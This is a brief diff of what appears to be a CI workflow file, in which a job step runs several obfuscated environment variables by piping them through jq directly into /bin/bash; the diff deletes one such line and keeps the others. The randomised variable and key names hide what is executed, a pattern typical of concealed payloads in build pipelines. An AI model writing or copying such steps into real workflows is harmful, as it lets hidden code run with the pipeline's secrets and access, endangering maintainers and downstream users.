@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$xdg89351" | jq -r .w61 | /bin/bash
           echo $fhtdo863 | jq -r .d2 | /bin/bash
           printf '%s' "$lvcx5211" | jq -r .a579 | /bin/bash
-          printf '%s' "$rxgsk14706" | jq -r .uches5 | /bin/bash
           printf '%s' "$emvr339" | jq -r .ywdh78 | /bin/bash
 
       - name: Save output
